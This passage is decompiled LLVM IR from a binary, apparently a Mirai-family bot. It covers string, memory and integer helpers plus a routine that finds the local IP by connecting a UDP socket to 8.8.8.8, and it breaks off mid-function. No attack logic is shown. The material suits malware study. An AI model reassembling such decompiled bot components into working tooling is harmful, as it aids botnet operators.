  uselistorder i32 %v1_10ba0, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10bbc, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_10bd4 = icmp eq i32 %arg3, 0
  %v0_10bd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10bd4, i32 %v0_10bd8)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10be0

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10be0, %entry
  %v0_10be0 = phi i32 [ %v1_10be8, %dec_label_pc_10be0 ], [ 0, %entry ]
  %v2_10be0 = add i32 %v0_10be0, %arg2
  %v3_10be0 = inttoptr i32 %v2_10be0 to i8*
  %v4_10be0 = load i8, i8* %v3_10be0, align 1
  %v4_10be4 = add i32 %v0_10be0, %arg1
  %v5_10be4 = inttoptr i32 %v4_10be4 to i8*
  store i8 %v4_10be0, i8* %v5_10be4, align 1
  %v0_10be8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10be8 = add i32 %v0_10be8, 1
  store i32 %v1_10be8, i32* %ip.global-to-local, align 4
  %v9_10bec = icmp eq i32 %v1_10be8, %arg3
  br i1 %v9_10bec, label %dec_label_pc_10bf4, label %dec_label_pc_10be0

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10be0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10be8, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_10bf8 = load i32, i32* @r1, align 4
  %v2_10bf8 = icmp eq i32 %v0_10bf8, 0
  %v0_10bfc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10bf8, i32 %v0_10bfc)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c04

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10c04, %entry
  %v2_10c08 = phi i32 [ %v1_10c0c, %dec_label_pc_10c04 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10c08 = load i32, i32* @r0, align 4
  %v4_10c08 = add i32 %v3_10c08, %v2_10c08
  %v5_10c08 = inttoptr i32 %v4_10c08 to i8*
  store i8 0, i8* %v5_10c08, align 1
  %v0_10c0c = load i32, i32* %r2.global-to-local, align 4
  %v1_10c0c = add i32 %v0_10c0c, 1
  store i32 %v1_10c0c, i32* %r2.global-to-local, align 4
  %v1_10c10 = load i32, i32* @r1, align 4
  %v9_10c10 = icmp eq i32 %v1_10c0c, %v1_10c10
  br i1 %v9_10c10, label %dec_label_pc_10c18, label %dec_label_pc_10c04

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10c04
  %v1_10c18 = load i32, i32* @r0, align 4
  ret i32 %v1_10c18

; uselistorder directives
  uselistorder i32 %v1_10c0c, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10c30 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10c30, label %dec_label_pc_10c38, label %dec_label_pc_10c40

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c54, %dec_label_pc_10c40, %entry, %dec_label_pc_10c80
  %storemerge = phi i32 [ %v1_10c80, %dec_label_pc_10c80 ], [ -1, %entry ], [ -1, %dec_label_pc_10c40 ], [ -1, %dec_label_pc_10c54 ]
  ret i32 %storemerge

dec_label_pc_10c40:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10c38, label %dec_label_pc_10c48

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c40
  br label %dec_label_pc_10c60

dec_label_pc_10c54:                               ; preds = %bb, %dec_label_pc_10c74
  %v1_10c603 = phi i32 [ %v1_10c74, %dec_label_pc_10c74 ], [ 0, %bb ]
  %v1_10c54 = add i32 %v0_10c80, 1
  %v9_10c58 = icmp eq i32 %v1_10c54, %arg2
  br i1 %v9_10c58, label %dec_label_pc_10c38, label %dec_label_pc_10c60

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c54, %dec_label_pc_10c48
  %v0_10c80 = phi i32 [ %v1_10c54, %dec_label_pc_10c54 ], [ 0, %dec_label_pc_10c48 ]
  %v1_10c60 = phi i32 [ %v1_10c603, %dec_label_pc_10c54 ], [ 0, %dec_label_pc_10c48 ]
  %v2_10c60 = add i32 %v1_10c60, %arg3
  %v3_10c60 = inttoptr i32 %v2_10c60 to i8*
  %v4_10c60 = load i8, i8* %v3_10c60, align 1
  %v2_10c64 = add i32 %v0_10c80, %arg1
  %v3_10c64 = inttoptr i32 %v2_10c64 to i8*
  %v4_10c64 = load i8, i8* %v3_10c64, align 1
  %v9_10c68 = icmp eq i8 %v4_10c64, %v4_10c60
  br i1 %v9_10c68, label %dec_label_pc_10c74, label %bb

bb:                                               ; preds = %dec_label_pc_10c60
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10c54

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c60
  %v1_10c74 = add i32 %v1_10c60, 1
  store i32 %v1_10c74, i32* @ip, align 4
  %v9_10c78 = icmp eq i32 %v1_10c74, %arg4
  br i1 %v9_10c78, label %dec_label_pc_10c80, label %dec_label_pc_10c54

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c74
  %v1_10c80 = add i32 %v0_10c80, 1
  br label %dec_label_pc_10c38

; uselistorder directives
  uselistorder i32 %v1_10c74, { 1, 2, 0 }
  uselistorder i32 %v1_10c60, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10c54, { 1, 0 }
  uselistorder label %dec_label_pc_10c38, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %.thread, %dec_label_pc_10cac, %bb, %entry
  %v0_10c98 = phi i32 [ %tmp, %entry ], [ %v5_10c98, %bb ], [ %v5_10c98, %dec_label_pc_10cac ], [ %v5_10c98, %.thread ]
  %v1_10c98 = inttoptr i32 %v0_10c98 to i8*
  %v2_10c98 = load i8, i8* %v1_10c98, align 1
  %v5_10c98 = add i32 %v0_10c98, 1
  %v7_10c9c = icmp eq i8 %v2_10c98, 9
  br i1 %v7_10c9c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10c98
  br label %dec_label_pc_10c98

bb:                                               ; preds = %dec_label_pc_10c98
  %v8_10ca0 = icmp eq i8 %v2_10c98, 32
  br i1 %v8_10ca0, label %dec_label_pc_10c98, label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %bb
  %v7_10cac = icmp eq i8 %v2_10c98, 10
  br i1 %v7_10cac, label %dec_label_pc_10c98, label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10cac
  %v7_10cb4 = icmp eq i8 %v2_10c98, 45
  br i1 %v7_10cb4, label %dec_label_pc_10da4, label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10cb4
  %v7_10cbc = icmp eq i8 %v2_10c98, 43
  br i1 %v7_10cbc, label %bb54, label %dec_label_pc_10ccc

bb54:                                             ; preds = %dec_label_pc_10cbc
  %v2_10cc0 = inttoptr i32 %v5_10c98 to i8*
  %v3_10cc0 = load i8, i8* %v2_10cc0, align 1
  %v6_10cc0 = add i32 %v0_10c98, 2
  br label %dec_label_pc_10ccc

dec_label_pc_10ccc:                               ; preds = %bb54, %dec_label_pc_10cbc, %dec_label_pc_10da4
  %v1_10d7439 = phi i32 [ %v5_10da4, %dec_label_pc_10da4 ], [ %v5_10c98, %dec_label_pc_10cbc ], [ %v6_10cc0, %bb54 ]
  %v0_10cf410.in = phi i8 [ %v2_10da4, %dec_label_pc_10da4 ], [ %v2_10c98, %dec_label_pc_10cbc ], [ %v3_10cc0, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10da4 ], [ 2147483647, %dec_label_pc_10cbc ], [ 2147483647, %bb54 ]
  %v0_10db4 = phi i32 [ 1, %dec_label_pc_10da4 ], [ 0, %dec_label_pc_10cbc ], [ 0, %bb54 ]
  %v2_10cd4 = udiv i32 %storemerge1, %arg2
  %v3_10cd4 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10cf4.outer

dec_label_pc_10cf4.outer:                         ; preds = %.thread5, %dec_label_pc_10ccc
  %v1_10d74.ph = phi i32 [ %v6_10d74, %.thread5 ], [ %v1_10d7439, %dec_label_pc_10ccc ]
  %v2_10d70.ph = phi i32 [ %v5_10d70, %.thread5 ], [ 0, %dec_label_pc_10ccc ]
  %v1_10d34.ph.in = phi i8 [ %v3_10d74, %.thread5 ], [ %v0_10cf410.in, %dec_label_pc_10ccc ]
  %v1_10d4c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10ccc ]
  %v3_10d40 = icmp uge i32 %v2_10d70.ph, %v2_10cd4
  %v9_10d40 = icmp eq i32 %v2_10d70.ph, %v2_10cd4
  %v2_10d44 = xor i1 %v3_10d40, true
  %v3_10d44 = or i1 %v9_10d40, %v2_10d44
  %v2_10d48 = xor i1 %v9_10d40, true
  %v3_10d48 = and i1 %v3_10d40, %v2_10d48
  %v2_10d68 = icmp eq i1 %v9_10d40, false
  br label %dec_label_pc_10cf4

dec_label_pc_10cf4:                               ; preds = %dec_label_pc_10cf4.outer, %dec_label_pc_10d7c
  %v1_10d74 = phi i32 [ %v5_10d7c, %dec_label_pc_10d7c ], [ %v1_10d74.ph, %dec_label_pc_10cf4.outer ]
  %v1_10d4c = phi i32 [ -1, %dec_label_pc_10d7c ], [ %v1_10d4c.ph, %dec_label_pc_10cf4.outer ]
  %v1_10d34.in = phi i8 [ %v2_10d7c, %dec_label_pc_10d7c ], [ %v1_10d34.ph.in, %dec_label_pc_10cf4.outer ]
  %v1_10d34 = zext i8 %v1_10d34.in to i32
  %v1_10cf4 = urem i32 %v1_10d34, 256
  %v1_10cf8 = add nsw i32 %v1_10cf4, -48
  %v1_10d00 = add nsw i32 %v1_10cf4, -97
  %v1_10d04 = add nsw i32 %v1_10d34, -48
  %v1_10d08 = add nsw i32 %v1_10cf4, -65
  %tmp87 = icmp ult i32 %v1_10cf8, 10
  br i1 %tmp87, label %dec_label_pc_10d38, label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10cf4
  %v2_10d10 = icmp ugt i32 %v1_10d08, 24
  %v7_10d10 = icmp eq i32 %v1_10d08, 25
  %v2_10d14 = xor i1 %v7_10d10, true
  %v3_10d14 = and i1 %v2_10d10, %v2_10d14
  br i1 %v3_10d14, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10d10
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10d10, %bb55
  %v0_10d2815 = phi i32 [ %v1_10d04, %dec_label_pc_10d10 ], [ 0, %bb55 ]
  %v2_10d18 = xor i1 %v2_10d10, true
  %v3_10d18 = or i1 %v7_10d10, %v2_10d18
  br i1 %v3_10d18, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10d28 = phi i32 [ %v0_10d2815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10d14, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10d20 = icmp ugt i32 %v1_10d00, 24
  %v11_10d20 = icmp eq i32 %v1_10d00, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10d24 = phi i1 [ %v7_10d10, %bb58 ], [ %v11_10d20, %bb59 ]
  %v0_10d24 = phi i1 [ %v2_10d10, %bb58 ], [ %v6_10d20, %bb59 ]
  %v2_10d24 = xor i1 %v1_10d24, true
  %v3_10d24 = and i1 %v0_10d24, %v2_10d24
  br i1 %v3_10d24, label %dec_label_pc_10d88, label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %bb60
  %v2_10d28 = icmp eq i32 %v0_10d28, 0
  %. = select i1 %v2_10d28, i32 87, i32 55
  %v2_10d34 = sub nsw i32 %v1_10d34, %.
  br label %dec_label_pc_10d38

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10cf4, %dec_label_pc_10d28
  %v0_10d4c33 = phi i32 [ %v1_10d08, %dec_label_pc_10cf4 ], [ %., %dec_label_pc_10d28 ]
  %v3_10d70 = phi i32 [ %v1_10d04, %dec_label_pc_10cf4 ], [ %v2_10d34, %dec_label_pc_10d28 ]
  %v2_10d38 = sub i32 %v3_10d70, %arg2
  %v4_10d38 = xor i32 %v3_10d70, %arg2
  %v5_10d38 = xor i32 %v2_10d38, %v3_10d70
  %v6_10d38 = and i32 %v5_10d38, %v4_10d38
  %v7_10d38 = icmp slt i32 %v6_10d38, 0
  %v8_10d38 = icmp slt i32 %v2_10d38, 0
  %v2_10d3c = xor i1 %v8_10d38, %v7_10d38
  br i1 %v2_10d3c, label %dec_label_pc_10d40, label %dec_label_pc_10d88

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d38
  br i1 %v3_10d44, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10d40
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10d40, %bb63
  %v0_10d4c32 = phi i32 [ %v0_10d4c33, %dec_label_pc_10d40 ], [ 0, %bb63 ]
  br i1 %v3_10d48, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10d4c = phi i32 [ %v0_10d4c32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10d4c, 0
  %v4_10d4c = zext i1 %tmp88 to i32
  %v5_10d4c = or i32 %v0_10d4c, %v4_10d4c
  %v7_10d4c = icmp eq i32 %v5_10d4c, 0
  br i1 %v7_10d4c, label %dec_label_pc_10d54, label %dec_label_pc_10d7c

dec_label_pc_10d54:                               ; preds = %bb66
  %v2_10d60 = sub i32 %v3_10d70, %v3_10cd4
  %v4_10d60 = xor i32 %v3_10d70, %v3_10cd4
  %v5_10d60 = xor i32 %v2_10d60, %v3_10d70
  %v6_10d60 = and i32 %v5_10d60, %v4_10d60
  %v7_10d60 = icmp slt i32 %v6_10d60, 0
  %v8_10d60 = icmp slt i32 %v2_10d60, 0
  %v9_10d60 = icmp eq i32 %v3_10d70, %v3_10cd4
  %v3_10d64 = xor i1 %v8_10d60, %v7_10d60
  %v4_10d64 = or i1 %v9_10d60, %v3_10d64
  br i1 %v4_10d64, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10d54
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10d54
  br i1 %v2_10d68, label %.thread5, label %dec_label_pc_10d7c

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10d70 = mul i32 %v2_10d70.ph, %arg2
  %v5_10d70 = add i32 %v3_10d70, %v4_10d70
  %v2_10d74 = inttoptr i32 %v1_10d74 to i8*
  %v3_10d74 = load i8, i8* %v2_10d74, align 1
  %v6_10d74 = add i32 %v1_10d74, 1
  br label %dec_label_pc_10cf4.outer

dec_label_pc_10d7c:                               ; preds = %thread-pre-split, %bb66
  %v1_10d7c = inttoptr i32 %v1_10d74 to i8*
  %v2_10d7c = load i8, i8* %v1_10d7c, align 1
  %v5_10d7c = add i32 %v1_10d74, 1
  br label %dec_label_pc_10cf4

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d38, %bb60
  %v1_10d88 = icmp slt i32 %v1_10d4c, 0
  %v2_10db4 = icmp eq i32 %v0_10db4, 0
  br i1 %v1_10d88, label %dec_label_pc_10db4, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d88
  br i1 %v2_10db4, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10d90
  %v2_10d94 = sub i32 0, %v2_10d70.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10d90, %bb69
  %v1_10da0 = phi i32 [ -2147483648, %bb71 ], [ %v2_10d70.ph, %dec_label_pc_10d90 ], [ %v2_10d94, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10da0

dec_label_pc_10da4:                               ; preds = %dec_label_pc_10cb4
  %v1_10da4 = inttoptr i32 %v5_10c98 to i8*
  %v2_10da4 = load i8, i8* %v1_10da4, align 1
  %v5_10da4 = add i32 %v0_10c98, 2
  br label %dec_label_pc_10ccc

dec_label_pc_10db4:                               ; preds = %dec_label_pc_10d88
  br i1 %v2_10db4, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10db4
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10db4
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10db4, { 1, 0 }
  uselistorder i32 %v2_10d60, { 1, 0 }
  uselistorder i32 %v2_10d38, { 1, 0 }
  uselistorder i32 %v3_10d70, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10d10, { 1, 2, 0 }
  uselistorder i1 %v2_10d10, { 1, 0, 2 }
  uselistorder i32 %v1_10cf4, { 1, 2, 0 }
  uselistorder i32 %v1_10d34, { 1, 0, 2 }
  uselistorder i32 %v1_10d4c, { 1, 0 }
  uselistorder i32 %v1_10d74, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10d40, { 1, 0, 2 }
  uselistorder i1 %v3_10d40, { 1, 0 }
  uselistorder i32 %v2_10d70.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_10cd4, { 1, 0, 2 }
  uselistorder i32 %v2_10cd4, { 1, 0 }
  uselistorder i32 %v5_10c98, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10c98, { 0, 1, 3, 2 }
  uselistorder i32 25, { 14, 15, 8, 2, 3, 0, 9, 4, 10, 1, 11, 5, 6, 12, 7, 13 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10d38, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10ccc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c98, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10dc4 = load i32, i32* @r4, align 4
  store i32 %v3_10dc4, i32* %stack_var_-24, align 4
  %v6_10dc4 = load i32, i32* @r5, align 4
  %v9_10dc4 = load i32, i32* @r6, align 4
  %v12_10dc4 = load i32, i32* @r7, align 4
  %v15_10dc4 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10e00.dec_label_pc_10ddc_crit_edge, %entry
  %v0_10de0 = phi i32 [ %v0_10de0.pre, %dec_label_pc_10e00.dec_label_pc_10ddc_crit_edge ], [ %arg3, %entry ]
  %v0_10ddc = phi i32 [ %v5_10e00, %dec_label_pc_10e00.dec_label_pc_10ddc_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_10ddc, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10de8 = call i32 @__libc_read(i32 %v0_10de0)
  %v7_10dec = icmp eq i32 %v1_10de8, 1
  %v0_10df4 = load i32, i32* @r5, align 4
  br i1 %v7_10dec, label %dec_label_pc_10df4, label %dec_label_pc_10e0c

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10ddc
  %v1_10df4 = add i32 %v0_10df4, 1
  store i32 %v1_10df4, i32* @r5, align 4
  %v1_10df8 = load i32, i32* @r8, align 4
  %v6_10dfc = icmp slt i32 %v1_10df4, %v1_10df8
  br i1 %v6_10dfc, label %dec_label_pc_10e00, label %.loopexit

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10df4
  %v0_10e00 = load i32, i32* @r4, align 4
  %v1_10e00 = inttoptr i32 %v0_10e00 to i8*
  %v2_10e00 = load i8, i8* %v1_10e00, align 1
  %v3_10e00 = zext i8 %v2_10e00 to i32
  store i32 %v3_10e00, i32* @r3, align 4
  %v5_10e00 = add i32 %v0_10e00, 1
  store i32 %v5_10e00, i32* @r4, align 4
  %v7_10e04 = icmp eq i8 %v2_10e00, 10
  br i1 %v7_10e04, label %dec_label_pc_10e0c, label %dec_label_pc_10e00.dec_label_pc_10ddc_crit_edge

dec_label_pc_10e00.dec_label_pc_10ddc_crit_edge:  ; preds = %dec_label_pc_10e00
  %v0_10de0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10ddc, %dec_label_pc_10e00
  %v0_10e0c = phi i32 [ %v1_10df4, %dec_label_pc_10e00 ], [ %v0_10df4, %dec_label_pc_10ddc ]
  %v2_10e0c = icmp eq i32 %v0_10e0c, 0
  br i1 %v2_10e0c, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10e0c
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10df4, %dec_label_pc_10e0c, %bb
  %v0_10e14 = load i32, i32* @r7, align 4
  %v2_10e18 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10e18, i32* @r4, align 4
  store i32 %v6_10dc4, i32* @r5, align 4
  store i32 %v9_10dc4, i32* @r6, align 4
  store i32 %v12_10dc4, i32* @r7, align 4
  store i32 %v15_10dc4, i32* @r8, align 4
  ret i32 %v0_10e14

; uselistorder directives
  uselistorder i32 %v5_10e00, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e20 = load i32, i32* @r4, align 4
  %v6_10e20 = load i32, i32* @r5, align 4
  %v9_10e20 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10e30 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10e38 = inttoptr i32 %v0_10e30 to i32*
  store i32 0, i32* %v2_10e38, align 4
  %v0_10e44 = load i32, i32* %r4.global-to-local, align 4
  %v3_10e48 = call i32 @socket(i32 2, i32 2, i32 %v0_10e44)
  %v7_10e4c = icmp eq i32 %v3_10e48, -1
  store i32 %v3_10e48, i32* @r5, align 4
  br i1 %v7_10e4c, label %bb, label %dec_label_pc_10e5c

bb:                                               ; preds = %entry
  %v1_10e54 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10ea8

dec_label_pc_10e5c:                               ; preds = %entry
  %v2_10e68 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10e68, i32* @r4, align 4
  %v0_10e74 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10e88 = call i32 @__libc_connect(i32 %v3_10e48, i32 %v2_10e68, i32 %v0_10e74)
  store i32 %v2_10e68, i32* @r1, align 4
  %v2_10e90 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10e94 = load i32, i32* @r5, align 4
  %v3_10e98 = call i32 @__GI_getsockname(i32 %v0_10e94, i32 %v2_10e68, i32 %v2_10e90)
  %v0_10e9c = load i32, i32* @r5, align 4
  %v1_10ea0 = call i32 @__GI___libc_close(i32 %v0_10e9c)
  br label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %bb, %dec_label_pc_10e5c
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10e5c ], [ %v1_10e54, %bb ]
  store i32 %v3_10e20, i32* @r4, align 4
  store i32 %v6_10e20, i32* @r5, align 4
  store i32 %v9_10e20, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10e68, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10e48, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 9, 1, 8, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 24, 26, 23, 4, 25, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10ea8, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10eb8 = load i8, i8* %tmp, align 1
  %v4_10eb8 = zext i8 %v3_10eb8 to i32
  store i32 %v4_10eb8, i32* @r3, align 4
  %v2_10ebc = icmp eq i8 %v3_10eb8, 0
  br i1 %v2_10ebc, label %bb, label %dec_label_pc_10ed0

bb:                                               ; preds = %entry
  br label %dec_label_pc_10ee4

dec_label_pc_10ed0:                               ; preds = %entry
  br label %dec_label_pc_10ed4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_10ed0
  %v0_10ed4 = phi i32 [ %v1_10ed4, %dec_label_pc_10ed4 ], [ 0, %dec_label_pc_10ed0 ]
  %v1_10ed4 = add i32 %v0_10ed4, 1
  %v2_10ed8 = add i32 %v1_10ed4, %arg2
  %v3_10ed8 = inttoptr i32 %v2_10ed8 to i8*
  %v4_10ed8 = load i8, i8* %v3_10ed8, align 1
  %v6_10ed8 = zext i8 %v4_10ed8 to i32
  store i32 %v6_10ed8, i32* @r3, align 4
  %v2_10edc = icmp eq i8 %v4_10ed8, 0
  br i1 %v2_10edc, label %dec_label_pc_10ee4, label %dec_label_pc_10ed4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10ed4, %bb
  %v0_10f2821 = phi i32 [ %v4_10eb8, %bb ], [ %v1_10ed4, %dec_label_pc_10ed4 ]
  %v0_10eec2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10eec2, 1
  br i1 %tmp29, label %dec_label_pc_10f3c, label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ee4, %dec_label_pc_10eec.backedge
  %v0_10ef0.in = phi i32 [ %v0_10ef0, %dec_label_pc_10eec.backedge ], [ %v0_10eec2, %dec_label_pc_10ee4 ]
  %v1_10f04 = phi i32 [ %v1_10f0415, %dec_label_pc_10eec.backedge ], [ 0, %dec_label_pc_10ee4 ]
  %v0_10ef8 = phi i32 [ %v5_10ef8, %dec_label_pc_10eec.backedge ], [ %tmp23, %dec_label_pc_10ee4 ]
  %v0_10ef0 = add i32 %v0_10ef0.in, -1
  %v1_10ef8 = inttoptr i32 %v0_10ef8 to i8*
  %v2_10ef8 = load i8, i8* %v1_10ef8, align 1
  %v3_10ef8 = zext i8 %v2_10ef8 to i32
  %v5_10ef8 = add i32 %v0_10ef8, 1
  %v1_10efc = add nsw i32 %v3_10ef8, -65
  %v2_10f04 = add i32 %v1_10f04, %arg2
  %v3_10f04 = inttoptr i32 %v2_10f04 to i8*
  %v4_10f04 = load i8, i8* %v3_10f04, align 1
  %v6_10f04 = zext i8 %v4_10f04 to i32
  store i32 %v6_10f04, i32* @r3, align 4
  %v1_10f08 = add nsw i32 %v6_10f04, -65
  %tmp38 = icmp ult i32 %v1_10efc, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10ef8
  %v5_10f0c = or i32 %v3_10ef8, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10ef8, %bb30
  %v0_10f18 = phi i32 [ %v3_10ef8, %dec_label_pc_10ef8 ], [ %v5_10f0c, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10f08, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10f14 = or i32 %v6_10f04, 96
  store i32 %v5_10f14, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10f18 = phi i32 [ %v6_10f04, %bb31 ], [ %v5_10f14, %bb32 ]
  %v9_10f18 = icmp eq i32 %v0_10f18, %v1_10f18
  br i1 %v9_10f18, label %dec_label_pc_10f24, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10eec.backedge

dec_label_pc_10eec.backedge:                      ; preds = %bb34, %dec_label_pc_10f24
  %v1_10f0415 = phi i32 [ 0, %bb34 ], [ %v1_10f24, %dec_label_pc_10f24 ]
  %tmp35 = icmp slt i32 %v0_10ef0, 1
